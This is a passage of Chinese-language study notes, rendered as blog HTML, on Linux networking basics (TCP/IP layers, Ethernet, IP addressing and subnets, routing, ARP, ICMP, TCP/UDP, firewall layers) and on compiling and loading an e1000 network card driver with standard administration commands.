每层都会有自己独特的头部数据 (header).</p><p>TCP&#x2F;IP 简化为 4 层. 其将应用, 表示, 会话三层整合成一个应用层, 将数据链路层和物理层整合成网络接口层.</p><h2 id="2-2-TCP-IP-的网络接口层的相关协议"><a href="#2-2-TCP-IP-的网络接口层的相关协议" class="headerlink" title="2.2 TCP\IP 的网络接口层的相关协议"></a>2.2 TCP\IP 的网络接口层的相关协议</h2><h3 id="2-2-1-广域网使用的设备"><a href="#2-2-1-广域网使用的设备" class="headerlink" title="2.2.1 广域网使用的设备"></a>2.2.1 广域网使用的设备</h3><h4 id="1-传统电话拨号连接-通过-PPP-协议"><a href="#1-传统电话拨号连接-通过-PPP-协议" class="headerlink" title="1. 传统电话拨号连接: 通过 PPP 协议"></a>1. 传统电话拨号连接: 通过 PPP 协议</h4><p>PPP 协议 (Point-to-Point Protocol).</p><p>PPP 协议支持 TCP&#x2F;IP, NetBEUI, IPX&#x2F;SPX 等通信协议.</p><h4 id="2-整合服务数字网络-Integrated-Services-Digital-Network-ISDN"><a href="#2-整合服务数字网络-Integrated-Services-Digital-Network-ISDN" class="headerlink" title="2. 整合服务数字网络 (Integrated Services Digital Network, ISDN)"></a>2. 整合服务数字网络 (Integrated Services Digital Network, ISDN)</h4><h4 id="3-非对称数字用户环路-Asymmetric-Digital-Subscriber-Line-ADSL-使用-PPPoE-协议"><a href="#3-非对称数字用户环路-Asymmetric-Digital-Subscriber-Line-ADSL-使用-PPPoE-协议" class="headerlink" title="3. 非对称数字用户环路 (Asymmetric Digital Subscriber Line, ADSL): 使用 PPPoE 协议"></a>3. 非对称数字用户环路 (Asymmetric Digital Subscriber Line, ADSL): 使用 PPPoE 协议</h4><p>由于上传&#x2F;下载的带宽不同, 因此才称为非对称的环路.</p><p>PPPoE 为 PPP over Ethernet.</p><h4 id="4-电缆调制解调器-Cable-Modem"><a href="#4-电缆调制解调器-Cable-Modem" class="headerlink" title="4. 电缆调制解调器 (Cable Modem)"></a>4. 电缆调制解调器 (Cable Modem)</h4><h3 id="2-2-2-局域网使用的设备-–-以太网"><a href="#2-2-2-局域网使用的设备-–-以太网" class="headerlink" title="2.2.2 局域网使用的设备 – 以太网"></a>2.2.2 局域网使用的设备 – 以太网</h3><p>整个网络世界并非仅有以太网这个硬件接口.</p><h4 id="1-以太网的速度与标准"><a href="#1-以太网的速度与标准" class="headerlink" title="1. 以太网的速度与标准"></a>1. 以太网的速度与标准</h4><p>以太网标准为 802.3 的 IEEE 10BASE5, 主要定义为: 10 代表传输数据为 10 Mbps, BASE 表示采用基带信号来进行传输, 至于 5 则是指每个网络节点之间最长可达 500 米.</p><p>网络传输的信息就是 0 和 1.</p><p>一般的 2Mbps&#x2F;128Kbps 指的是 bit 的传输而不是 byte, 因此要处以 8.</p><p>使用四对绞线的网线,也就是常见的 8 蕊网线, 这种网线常被称为五类 (Category 5) 的网线.</p><p>提升传输速度, 和网线极大相关.</p><h4 id="2-以太网的网线接头-交叉-x2F-直连线"><a href="#2-以太网的网线接头-交叉-x2F-直连线" class="headerlink" title="2. 以太网的网线接头 (交叉&#x2F;直连线)"></a>2. 以太网的网线接头 (交叉&#x2F;直连线)</h4><p>目前在以太网上最常见到的接头就是 RJ-45 的网络接头.</p><h3 id="2-2-3-以太网络的传输协议-CSMA-x2F-CD"><a href="#2-2-3-以太网络的传输协议-CSMA-x2F-CD" class="headerlink" title="2.2.3 以太网络的传输协议: CSMA&#x2F;CD"></a>2.2.3 以太网络的传输协议: CSMA&#x2F;CD</h3><p>整个以太网的重心就是以太网卡.</p><p>以太网的传输主要就是网卡对网卡之间的数据传输.</p><p>每张网卡都有一个独一无二的编号, 即 MAC (Media Access Control).   </p><p><mark>集线器是一种网络共享介质设备</mark>, 即,网络共享介质在单一时间点内, 仅能被一台主机所使用.</p><p>不管哪一台主机发送出数据帧, 所有计算机都会接收到.</p><h3 id="2-2-4-MAC-的封装格式"><a href="#2-2-4-MAC-的封装格式" class="headerlink" title="2.2.4 MAC 的封装格式"></a>2.2.4 MAC 的封装格式</h3><p>在 Linux 当中,可以使用 ifconfig 命令来查看网卡卡号.</p><p>数据包上的 MAC 地址会变化.</p><p>防火墙软件大多也能够针对网卡来进行策略的定义. 不过针对网卡的限制仅能在局域网内进行, 因为 MAC 不能跨 Router.</p><p>数据量最小需要有 46 bytes.</p><h3 id="2-2-5-MUT-最大传输单位"><a href="#2-2-5-MUT-最大传输单位" class="headerlink" title="2.2.5 MUT (最大传输单位)"></a>2.2.5 MUT (最大传输单位)</h3><p>以太网数据帧所能传送的数据量最大可以达到 1500 bytes, 这个数值就被称为 MTU (Maximum Transmission Unit, 最大传输单元).</p><p>每种网络接口的 MTU 都不同.</p><p>不论你的网络媒体支持的 MTU 有多大, 你必须考虑到你的数据包需要传到目的地时, 所需要经过的所有网络设备,然后在来决定你的 MTU 配置.</p><h3 id="2-2-6-集线器-交换器与相关机制"><a href="#2-2-6-集线器-交换器与相关机制" class="headerlink" title="2.2.6 集线器, 交换器与相关机制"></a>2.2.6 集线器, 交换器与相关机制</h3><h4 id="1-共不共享很重要-集线器还是交换器"><a href="#1-共不共享很重要-集线器还是交换器" class="headerlink" title="1. 共不共享很重要, 集线器还是交换器"></a>1. 共不共享很重要, 集线器还是交换器</h4><p>交换器 (switch) 是非共享的, 其不会有冲突.</p><p>交换器与集线器最大的差异, 在于交换器内有一个特别的内存, 这个内存可以记录每个 Switch port 与其连接的 PC 的 MAC 地址.</p><p>当来自 Switch 两端的 PC 要互传数据时, 每个数据帧将直接通过交换器的内存数据而传送到目标主机上, Switch 的每个端口 (port) 都有独立的带宽.</p><p>Switch 已经克服了数据包冲突的问题, 因为 Switch port 有对应 MAC 的相关功能.</p><p>在选购的时候, 选择支持全双工&#x2F;半双工, 以及支持 Jumbo frame 的为佳.</p><h4 id="2-什么是全双工-x2F-半双工-full-dumplex-x2F-half-dumplex"><a href="#2-什么是全双工-x2F-半双工-full-dumplex-x2F-half-dumplex" class="headerlink" title="2. 什么是全双工&#x2F;半双工 (full-dumplex&#x2F;half-dumplex)"></a>2. 什么是全双工&#x2F;半双工 (full-dumplex&#x2F;half-dumplex)</h4><h4 id="3-自动协调速度机制-auto-negotiation"><a href="#3-自动协调速度机制-auto-negotiation" class="headerlink" title="3. 自动协调速度机制 (auto-negotiation)"></a>3. 自动协调速度机制 (auto-negotiation)</h4><p>可自动协调出最高的传输速度来通信.</p><h4 id="4-自动分辨网线的交叉或直连接口-Auto-MDI-x2F-MDIX"><a href="#4-自动分辨网线的交叉或直连接口-Auto-MDI-x2F-MDIX" class="headerlink" title="4. 自动分辨网线的交叉或直连接口 (Auto MDI&#x2F;MDIX)"></a>4. 自动分辨网线的交叉或直连接口 (Auto MDI&#x2F;MDIX)</h4><p>自动分辨网线的接口来调整连接.</p><h2 id="2-3-TCP-x2F-IP-的网络曾相关数据包与数据"><a href="#2-3-TCP-x2F-IP-的网络曾相关数据包与数据" class="headerlink" title="2.3 TCP&#x2F;IP 的网络曾相关数据包与数据"></a>2.3 TCP&#x2F;IP 的网络曾相关数据包与数据</h2><h3 id="2-3-1-IP-数据包的封装"><a href="#2-3-1-IP-数据包的封装" class="headerlink" title="2.3.1 IP 数据包的封装"></a>2.3.1 IP 数据包的封装</h3><h3 id="2-3-2-IP-地址的组成与分级"><a href="#2-3-2-IP-地址的组成与分级" class="headerlink" title="2.3.2 IP 地址的组成与分级"></a>2.3.2 IP 地址的组成与分级</h3><p>将 32 bits 的 IP 分成四小段, 每段含有 8 个 bits, 将 8 个 bits 换算成十进制.</p><p>IP 又分为:</p><ul><li>Net_ID, 网络号码, 前面三组数字</li><li>Host_ID, 主机号码, 后面一组数字</li></ul><p>对于同一个网络的定义是 – 在同一个物理网段内, 主机的 IP 具有相同的 Net_ID, 并且具有独特的 Host_ID.</p><h4 id="1-IP-在同一网络的意义"><a href="#1-IP-在同一网络的意义" class="headerlink" title="1. IP 在同一网络的意义"></a>1. IP 在同一网络的意义</h4><h5 id="Net-ID-与-Host-ID-的限制"><a href="#Net-ID-与-Host-ID-的限制" class="headerlink" title="Net_ID 与 Host_ID 的限制"></a>Net_ID 与 Host_ID 的限制</h5><p>在同一个网段内, Net_ID 是不变的, 而 Host_ID 则是不可重复的.</p><p>Host_ID 在二进制的表示法中, 不可同时为 0, 也不可同时为 1.</p><p>Host_ID 全为 0 表示整个网段的地址 (Network IP). 全为 1 则表示为广播的地址 (Broadcast IP).</p><h5 id="在局域网内通过-IP-广播传递数据"><a href="#在局域网内通过-IP-广播传递数据" class="headerlink" title="在局域网内通过 IP 广播传递数据"></a>在局域网内通过 IP 广播传递数据</h5><p>同一个网段内, 可直接用 MAC 地址交流.</p><h4 id="2-IP-与门牌号码的联想"><a href="#2-IP-与门牌号码的联想" class="headerlink" title="2. IP 与门牌号码的联想"></a>2. IP 与门牌号码的联想</h4><h4 id="3-IP-的分级"><a href="#3-IP-的分级" class="headerlink" title="3. IP 的分级"></a>3. IP 的分级</h4><p>IP 网段分为 5 个等级, 每种等级的范围主要与 IP 的 32 bits 数值的前面几个位有关.</p><h3 id="2-3-3-IP-的种类与取得方式"><a href="#2-3-3-IP-的种类与取得方式" class="headerlink" title="2.3.3 IP 的种类与取得方式"></a>2.3.3 IP 的种类与取得方式</h3><p>在 IPv4 里面就只有两种 IP 的类别:</p><ul><li>Public IP : 公共 IP, 经由 Inter NIC 所统一规划的 IP, 这种 IP 才能连接 Internet</li><li>Private IP : 私有或保留 IP, 不能直接连上 Internet 的 IP, 主要用于局域网格内的主机连接规划</li></ul><p>私有 IP 分别在 A, B, C 三个 Class 当中各保留一段作为私有 IP 网段.</p><p>在防火墙上加上 NAT (Network Address Transfer) 服务, 可以通过伪装 IP 来使私有 IP 的计算机来连上 Internete.</p><h4 id="1-特殊的-Loopback-IP-网段"><a href="#1-特殊的-Loopback-IP-网段" class="headerlink" title="1. 特殊的 Loopback IP 网段"></a>1. 特殊的 Loopback IP 网段</h4><p>即 lo 网络,用来测试操作系统内部循环所用的一个网络, 同时也能够提供给系统内部原本就需要使用网络接口的服务 (daemon) 所使用.</p><p>这个网段在 127.0.0.0&#x2F;8 这个 class A, 默认的主机 IP 为 127.0.0.1, 可用来测试网站. 用 <code>http://localhost</code>.</p><h4 id="2-IP-的取得方式"><a href="#2-IP-的取得方式" class="headerlink" title="2. IP 的取得方式"></a>2. IP 的取得方式</h4><ul><li>直接手动配置 (static)</li><li>通过拨号取得</li><li>自动取得网络参数 (DHCP)</li></ul><h3 id="2-3-4-Netmask-子网与CIDR-Classless-Interdomain-Routing"><a href="#2-3-4-Netmask-子网与CIDR-Classless-Interdomain-Routing" class="headerlink" title="2.3.4 Netmask, 子网与CIDR (Classless Interdomain Routing)"></a>2.3.4 Netmask, 子网与CIDR (Classless Interdomain Routing)</h3><h4 id="1-Netmask"><a href="#1-Netmask" class="headerlink" title="1. Netmask"></a>1. Netmask</h4><p>Netmask 又称 Subnet mask, 即子网掩码. 用来实现子网的划分.</p><h4 id="2-子网划分"><a href="#2-子网划分" class="headerlink" title="2. 子网划分"></a>2. 子网划分</h4><p>根据 24 位来判断有几个网段, 如 Net_ID 为 26 位, 即 26 - 24 &#x3D; 2, 有 $2^2$ 即 4 个网段.</p><h4 id="3-无类别域间路由-CIDR-Class-Interdomain-Routing"><a href="#3-无类别域间路由-CIDR-Class-Interdomain-Routing" class="headerlink" title="3. 无类别域间路由 CIDR (Class Interdomain Routing)"></a>3. 无类别域间路由 CIDR (Class Interdomain Routing)</h4><h3 id="2-3-5-路由概念"><a href="#2-3-5-路由概念" class="headerlink" title="2.3.5 路由概念"></a>2.3.5 路由概念</h3><p>在同一个局域网内, 可以通过 IP 广播的方式来实现数据传递的目的.</p><p>不同网段之间通过路由器传递数据.</p><p>每台主机都有自己的 <mark>路由表</mark>. 数据的传递将依据这个路由表进行传送.</p><p><mark>网关&#x2F;路由</mark>, Gateway&#x2F;Router 的功能就是负责不同网络之间的数据包传递 (IP Forwarding). 所以网关和路由似乎可以等价.</p><h3 id="2-3-6-观察主机路由-Route"><a href="#2-3-6-观察主机路由-Route" class="headerlink" title="2.3.6 观察主机路由: Route"></a>2.3.6 观察主机路由: Route</h3><p>路由一旦设置错误, 将会导致某些数据包完全无法正确的送出去.</p><p>观察路由表的命令:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span><span class="hljs-meta"> [-n]</span><br></code></pre></td></tr></table></figure><p><code>-n</code> 是将主机名以 IP 的方式显示.</p><p>输出中的 Destination 就是 Network, 表示网络.</p><p>Gateway 那一栏为 <code>0.0.0.0</code> 表示不需要通过 Gateway 传播, 而是直接从 Iface 接口发送.</p><p>若要传送的数据包目的地 IP 不再路由规则里, 那么数据包就会被传送到 “default” 所在的路由规则.<br>输出中的 <code>Flags</code>, 有多个标志可以来表示该网络或主机代表的意义:</p><ul><li>U : 代表该路由可用</li><li>G : 代表该网络需要经由 Gateway 来帮忙传递</li><li>H : 代表该行路由为一台主机, 而非一整个网络</li></ul><h3 id="2-3-7-IP-与-MAC-网络接口层的-ARP-与-RARP-协议"><a href="#2-3-7-IP-与-MAC-网络接口层的-ARP-与-RARP-协议" class="headerlink" title="2.3.7 IP 与 MAC: 网络接口层的 ARP 与 RARP 协议"></a>2.3.7 IP 与 MAC: 网络接口层的 ARP 与 RARP 协议</h3><p>ARP (Address Resolution Protocol, 网络地址解析) 协议.</p><p>RARP (Revers ARP, 反向网络地址解析).</p><p>当我们想了解某个 IP 配置在哪张以太网卡上时, 我们的主机就会对整个局域网发送出 ARP 数据包, 对方收到 ARP 数据包后就会返回它的 MAC.</p><p>当 ARP 协议取得目标 IP 与它的网卡卡号后, 就会将该笔记录写入主机的 ARP table 中, 记录 20 分钟.</p><p>取得网卡卡号 (MAC):</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>取得 ARP 表格内的 IP&#x2F;MAC 对应数据:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-attr">[nd]</span> hostname<br></code></pre></td></tr></table></figure><p>参数与选项:</p><ul><li><code>-n</code> : 将主机名以 IP 的形态显示</li><li><code>-d</code> : delete, 将 hostname 的 hardware_address 由 ARP table 中删掉</li><li><code>-s</code> : set, 设定某个 IP 或 hostname 的 MAC 到 ARP table 当中</li></ul><h3 id="2-3-8-ICMP-协议"><a href="#2-3-8-ICMP-协议" class="headerlink" title="2.3.8 ICMP 协议"></a>2.3.8 ICMP 协议</h3><p>Internet Control Message Protocol, 因特网信息控制协议.</p><p>其最大功能就是确保我们网络的连接状态与连接的正确性.</p><p>利用 ICMP 来检验网络状态最简单的命令就是 <code>ping</code> 与 <code>traceroute</code>.</p><h2 id="2-4-TCP-x2F-IP-的传输层相关数据包与数据"><a href="#2-4-TCP-x2F-IP-的传输层相关数据包与数据" class="headerlink" title="2.4 TCP&#x2F;IP 的传输层相关数据包与数据"></a>2.4 TCP&#x2F;IP 的传输层相关数据包与数据</h2><h3 id="2-4-1-面向连接的可靠的-TCP-协议"><a href="#2-4-1-面向连接的可靠的-TCP-协议" class="headerlink" title="2.4.1 面向连接的可靠的 TCP 协议"></a>2.4.1 面向连接的可靠的 TCP 协议</h3><p>IP 地址的两端, 连接的是 Server 和 Clicent 的 port.</p><h4 id="1-通信端口"><a href="#1-通信端口" class="headerlink" title="1. 通信端口"></a>1. 通信端口</h4><p>来源与目标的端口都是 16 位, 其做大可达 65535 ( $2^16$ ).</p><p>可以通过 port 来判断应用程序.</p><h4 id="2-特权端口-Privileged-Ports"><a href="#2-特权端口-Privileged-Ports" class="headerlink" title="2. 特权端口 (Privileged Ports)"></a>2. 特权端口 (Privileged Ports)</h4><p>Internet 上面已经有很多规范好的固定 port (well-known port), 这些 port number 通常小于 1024.</p><p>小于 1024 以下的端口要启动时, 启动者的身份必须要是 root 才行, 所以叫做特权端口.</p><p>在 Linux 环境内下, 各网络服务与 port number 的对应默认写在 <code>/etc/services</code> 文件内.</p><h4 id="3-Socket-Pair"><a href="#3-Socket-Pair" class="headerlink" title="3. Socket Pair"></a>3. Socket Pair</h4><p>由于网络是双向的, 要达成连接的话需要服务器与客户端均提供了 IP 与端口才行. 因此, 常称这个成对的数据为 Socket Pair.</p><ul><li>Source Address + Source Port</li><li>Destination Address + Destination Port</li></ul><h3 id="2-4-2-TCP-的三次握手"><a href="#2-4-2-TCP-的三次握手" class="headerlink" title="2.4.2 TCP 的三次握手"></a>2.4.2 TCP 的三次握手</h3><p>在连接之前都必需要通过三个确认动作, 所以这种连接方式也就被称为三次握手 (Three-way handshake).</p><h3 id="2-4-3-无连接的-UDP-协议"><a href="#2-4-3-无连接的-UDP-协议" class="headerlink" title="2.4.3 无连接的 UDP 协议"></a>2.4.3 无连接的 UDP 协议</h3><p>User Datagram Protocol, 用户数据报协议.</p><p>UDP 在传输过程中, 接收端在收到数据包之后, 不会回复响应数据包 (ACK) 给发送端.</p><h3 id="2-4-5-网络防火墙与-OSI-七层协议"><a href="#2-4-5-网络防火墙与-OSI-七层协议" class="headerlink" title="2.4.5 网络防火墙与 OSI 七层协议"></a>2.4.5 网络防火墙与 OSI 七层协议</h3><p>以 OSI 七层协议来说, 每一层可以阻挡的数据有:</p><ul><li>第二层 : 可以针对来源与目标的 MAC 进行阻挡</li><li>第三层 : 主要针对来源于目标的 IP, 以及 ICMP 的类别 (type) 进行阻挡</li><li>第四层 : 针对 TCP&#x2F;UDP 的端口进行阻挡, 也可以针对 TCP 的状态 (code) 来处理</li></ul><h2 id="2-5-连上-Internet-前的准备事项"><a href="#2-5-连上-Internet-前的准备事项" class="headerlink" title="2.5 连上 Internet 前的准备事项"></a>2.5 连上 Internet 前的准备事项</h2><h3 id="2-5-1-IP-地址-主机名与-DNS-系统"><a href="#2-5-1-IP-地址-主机名与-DNS-系统" class="headerlink" title="2.5.1 IP 地址, 主机名与 DNS 系统"></a>2.5.1 IP 地址, 主机名与 DNS 系统</h3><p>主机名称对应 IP 的系统就是 Domain Name System (DNS).</p><p>在 Linux 里, DNS 主机的 IP 的设定在 <code>/etc/resolv.conf</code> 这个文件中.</p><h3 id="2-5-2-连上-Internet-的必要网络参数"><a href="#2-5-2-连上-Internet-的必要网络参数" class="headerlink" title="2.5.2 连上 Internet 的必要网络参数"></a>2.5.2 连上 Internet 的必要网络参数</h3><p>一组合理的网络设置, 需要以下这些数据:</p><ul><li>IP</li><li>Netmask</li><li>Network</li><li>Broadcast</li><li>Gateway</li><li>DNS</li></ul><h1 id="第3章-局域网架构简介"><a href="#第3章-局域网架构简介" class="headerlink" title="第3章 局域网架构简介"></a>第3章 局域网架构简介</h1><h2 id="3-1-局域网的连接"><a href="#3-1-局域网的连接" class="headerlink" title="3.1 局域网的连接"></a>3.1 局域网的连接</h2><h3 id="3-1-1-局域网的布线规划"><a href="#3-1-1-局域网的布线规划" class="headerlink" title="3.1.1 局域网的布线规划"></a>3.1.1 局域网的布线规划</h3><h4 id="3-1-1-1-Linux-直接联网-–-让-Linux-与一般-PC-的地位相同"><a href="#3-1-1-1-Linux-直接联网-–-让-Linux-与一般-PC-的地位相同" class="headerlink" title="3.1.1.1 Linux 直接联网 – 让 Linux 与一般 PC 的地位相同"></a>3.1.1.1 Linux 直接联网 – 让 Linux 与一般 PC 的地位相同</h4><h4 id="3-1-1-2-Linux-直接联网-–-让-Linux-与一般-PC-处于不同地位"><a href="#3-1-1-2-Linux-直接联网-–-让-Linux-与一般-PC-处于不同地位" class="headerlink" title="3.1.1.2 Linux 直接联网 – 让 Linux 与一般 PC 处于不同地位"></a>3.1.1.2 Linux 直接联网 – 让 Linux 与一般 PC 处于不同地位</h4><h4 id="3-1-1-3-Linux-直接联网-–-让-Linxu-直接管理-LAN"><a href="#3-1-1-3-Linux-直接联网-–-让-Linxu-直接管理-LAN" class="headerlink" title="3.1.1.3 Linux 直接联网 – 让 Linxu 直接管理 LAN"></a>3.1.1.3 Linux 直接联网 – 让 Linxu 直接管理 LAN</h4><p>让 Linux 作为 IP 路由器的功能相当简单, 同时 Linux 必须具有两张网卡, 分别是对外和对内.</p><h4 id="3-1-1-4-Linux-放在防火墙后-–-让-Linux-使用-Private-IP"><a href="#3-1-1-4-Linux-放在防火墙后-–-让-Linux-使用-Private-IP" class="headerlink" title="3.1.1.4 Linux 放在防火墙后 – 让 Linux 使用 Private IP"></a>3.1.1.4 Linux 放在防火墙后 – 让 Linux 使用 Private IP</h4><h3 id="3-1-2-网络设备选购建议"><a href="#3-1-2-网络设备选购建议" class="headerlink" title="3.1.2 网络设备选购建议"></a>3.1.2 网络设备选购建议</h3><p>内置网卡的芯片通常是比较特殊的, 可能导致 Linux 内置的网卡驱动程序无法顺利驱动该网卡.</p><h2 id="3-2-本书使用的内部链接网络参数与通信协议"><a href="#3-2-本书使用的内部链接网络参数与通信协议" class="headerlink" title="3.2 本书使用的内部链接网络参数与通信协议"></a>3.2 本书使用的内部链接网络参数与通信协议</h2><h3 id="3-2-1-网络联机参数与通信协议"><a href="#3-2-1-网络联机参数与通信协议" class="headerlink" title="3.2.1 网络联机参数与通信协议"></a>3.2.1 网络联机参数与通信协议</h3><p>一张网卡可以设定多个 IP.</p><p>一个 IP 即为一个网络接口, 两个网络接口即可进行 NAT (类似 IP 路由器功能) 的设定.</p><p>在 Linux 中, 只要网络参数设定妥当, 那么 TCP&#x2F;IP 就已经被启用了, 所以不需要额外再安装其他通信协议.</p><p>如果需要将 Linux 系统中的硬盘空间分享给同网络的 Windows PC, 那么需要额外安装 SAMBA 这个服务器软件才行.</p><p>内部的 LAN 用 Private IP 来设定.</p><p>LAN 内的 PC 网络相关设定参数为:</p><ul><li>IP</li><li>Netmask</li><li>Network</li><li>Default Gateway</li><li>DNS</li></ul><h1 id="第4章-连接-Internet"><a href="#第4章-连接-Internet" class="headerlink" title="第4章 连接 Internet"></a>第4章 连接 Internet</h1><h2 id="4-1-Linux-连接-Internet-前的注意事项"><a href="#4-1-Linux-连接-Internet-前的注意事项" class="headerlink" title="4.1 Linux 连接 Internet 前的注意事项"></a>4.1 Linux 连接 Internet 前的注意事项</h2><h3 id="4-1-1-Linux-网卡"><a href="#4-1-1-Linux-网卡" class="headerlink" title="4.1.1 Linux 网卡"></a>4.1.1 Linux 网卡</h3><p>若 Linux 内核还未支持网卡设备, 可通过:</p><ul><li>重新编译内核</li><li>编译网卡的内核模块</li></ul><h4 id="3-观察内核所捕捉到的网卡信息"><a href="#3-观察内核所捕捉到的网卡信息" class="headerlink" title="3. 观察内核所捕捉到的网卡信息"></a>3. 观察内核所捕捉到的网卡信息</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dmesg <span class="hljs-string">|grep -in eth</span><br></code></pre></td></tr></table></figure><p>查看相关的设备芯片数据:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-string">|grep -i ethernet</span><br></code></pre></td></tr></table></figure><h4 id="4-观察网卡模块"><a href="#4-观察网卡模块" class="headerlink" title="4. 观察网卡模块"></a>4. 观察网卡模块</h4><p>内核是否顺利加载模块:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lsmod <span class="hljs-string">| grep 1000</span><br></code></pre></td></tr></table></figure><p>模块的相关信息:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">modinfo</span> e1000<br></code></pre></td></tr></table></figure><p>不同的内核版本使用的驱动程序是不一样的, 在更改内核之后, 自己编译的硬件驱动程序需要重新编译.</p><h3 id="4-1-2-编译网卡驱动程序"><a href="#4-1-2-编译网卡驱动程序" class="headerlink" title="4.1.2 编译网卡驱动程序"></a>4.1.2 编译网卡驱动程序</h3><p>在购买硬件时, 可以先查阅一下硬件包装上面是否提及支持 Linux.</p><p>由于编译程序需要编译程序以及内核相关信息, 因此需要预安装 Gcc. Make, Kernel-Header 等软件.</p><h4 id="1-取得官方网站的驱动程序"><a href="#1-取得官方网站的驱动程序" class="headerlink" title="1. 取得官方网站的驱动程序"></a>1. 取得官方网站的驱动程序</h4><p>在官网下载对应的驱动后放在 <code>/root</code> 下.</p><h4 id="2-解压缩与编译"><a href="#2-解压缩与编译" class="headerlink" title="2. 解压缩与编译"></a>2. 解压缩与编译</h4><p>大概看下就好:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf e1000-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">30</span>.tar.gz -C /usr/local/src<br><span class="hljs-attribute">cd</span> /usr/local/src/e1000-<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">30</span>/<br><span class="hljs-attribute">cd</span> src<br><span class="hljs-attribute">make</span> install<br></code></pre></td></tr></table></figure><p>最后这个模块会被编译完成且安装在: <code>/lib/modules/$(uname -r)/kernel/drivers/net/e1000/e1000.ko</code></p><h4 id="3-模块的测试与处理"><a href="#3-模块的测试与处理" class="headerlink" title="3. 模块的测试与处理"></a>3. 模块的测试与处理</h4><p>要先删除就的模块, 才能够重新加载这个模块:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rmmod</span> e1000<br>modprobe e1000<br>modinfo e1000<br></code></pre></td></tr></table></figure><h4 id="4-设定开机自动启动网卡模块"><a href="#4-设定开机自动启动网卡模块" class="headerlink" title="4. 设定开机自动启动网卡模块"></a>4. 设定开机自动启动网卡模块</h4><p>在 <code>/etc/modprobe.d/</code> 目录下建立一个名为 <code>ether.conf</code> 文件, 将模块与网卡代号链接在一起:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># vim /etc/modprobe.d/ether.conf</span><br><span class="hljs-built_in">alias</span> eth0 e1000<br><span class="hljs-built_in">alias</span> eth1 e1000<br><span class="hljs-comment"># sync ; reboot</span><br></code></pre></td></tr></table></figure><h4 id="5-尝试配置-IP"><a href="#5-尝试配置-IP" class="headerlink" title="5. 尝试配置 IP"></a>5. 尝试配置 IP</h4><p>手动分配私有 IP:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ifconfig</span> eth0 <span class="hljs-number">192.168.1.100</span><br></code></pre></td></tr></table></figure><h3 id="4-1-3-Linux-网络相关配置文件"><a href="#4-1-3-Linux-网络相关配置文件" class="headerlink" title="4.1.3 Linux 网络相关配置文件"></a>4.1.3 Linux 网络相关配置文件</h3><ul><li>&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</li><li>&#x2F;etc&#x2F;sysconfig&#x2F;network</li><li>&#x2F;etc&#x2F;resolv.conf</li><li>&#x2F;etc&#x2F;hosts</li><li>&#x2F;etc&#x2F;services</li><li>&#x2F;etc&#x2F;protocols</li></ul><h2 id="4-2-连接-Internet-的设置方法"><a href="#4-2-连接-Internet-的设置方法" class="headerlink" title="4.2 连接 Internet 的设置方法"></a>4.2 连接 Internet 的设置方法</h2><h3 id="4-2-1-手动配置固定-IP-参数"><a href="#4-2-1-手动配置固定-IP-参数" class="headerlink" title="4.2.1 手动配置固定 IP 参数"></a>4.2.1 手动配置固定 IP 参数</h3><h3 id="4-2-3-ADSL-拨号上网-适用-ADSL-拨号以及光纤接入"><a href="#4-2-3-ADSL-拨号上网-适用-ADSL-拨号以及光纤接入" class="headerlink" title="4.2.3 ADSL 拨号上网 (适用 ADSL 拨号以及光纤接入)"></a>4.2.3 ADSL 拨号上网 (适用 ADSL 拨号以及光纤接入)</h3><p>拨号上网, 可以使用 rp-pppoe 这套软件.</p><p>可以到以下网站取得:</p><ul><li><a href="http://www.roaringpenguin.com/pppoe">http://www.roaringpenguin.com/pppoe</a></li><li><a href="http://freshmeat.net/projects/rp-pppoe">http://freshmeat.net/projects/rp-pppoe</a></li></ul><p>re-pppoe 使用的是 Point to Point (ppp) over Ethernet 所产生的网络接口, 因此当顺利拨号成功之后, 会多产生一个网络接口 ppp0.</p><p>ppp0 是构建在以太网卡上的, 必须要有以太网卡, 同时, 即使拨号成功后, 也不能将没有用到的 eth0 关闭.</p><p>当 ppp0 拨号成功之后, 不要定义 GATEWAY, ISP 会主动给予 ppp0 接口一个可以连上 Internet 的 Default Gateway, 如果又定义另一个, 两个网关可能会造成网络不通.</p><h2 id="4-3-无线网络-–-以笔记本电脑为例"><a href="#4-3-无线网络-–-以笔记本电脑为例" class="headerlink" title="4.3 无线网络 – 以笔记本电脑为例"></a>4.3 无线网络 – 以笔记本电脑为例</h2><h3 id="4-3-1-无线网络所需要的硬件-AP-无线网卡"><a href="#4-3-1-无线网络所需要的硬件-AP-无线网卡" class="headerlink" title="4.3.1 无线网络所需要的硬件: AP, 无线网卡"></a>4.3.1 无线网络所需要的硬件: AP, 无线网卡</h3><p>Wireless Access Point, 即 